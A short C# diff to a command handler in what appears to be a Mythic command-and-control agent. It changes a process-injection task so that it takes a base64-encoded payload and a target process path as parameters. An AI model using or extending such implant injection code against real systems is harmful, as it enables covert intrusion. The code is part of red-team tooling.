@@ -3,6 +3,8 @@
 using Models.Tasks;
 
 using Extend;
+using System.Text;
+using System;
 
 namespace Tasks.Commands
 {
@@ -14,10 +16,11 @@ namespace Tasks.Commands
         {
             MythicTaskResult result;
 
-            var Arguments = task.parameters.Split(' ');
-            var FileBytes = new byte[10];
+            var Arguments = Encoding.UTF8.GetBytes(task.parameters).Deserialize<SpawnInjectParam>();
 
-            if (Arguments is null || Arguments.Length == 0)
+            var FileBytes = Convert.FromBase64String(Arguments.file);
+
+            if (Arguments is null || Arguments.path is null)
             {
                 result = new MythicTaskResult
                 {
@@ -30,10 +33,8 @@ namespace Tasks.Commands
                 return result;
             }
 
-            var path = Arguments[0];
-
             var injector = new SpawnInjector();
-            var success = injector.Inject(FileBytes, 0, path);
+            var success = injector.Inject(FileBytes, 0, Arguments.path);
 
             if (success)
             {
@@ -59,5 +60,11 @@ namespace Tasks.Commands
 
             return result;
         }
+    }
+
+    public class SpawnInjectParam
+    {
+        public string file { get; set; }
+        public string path { get; set; }
     }
 }
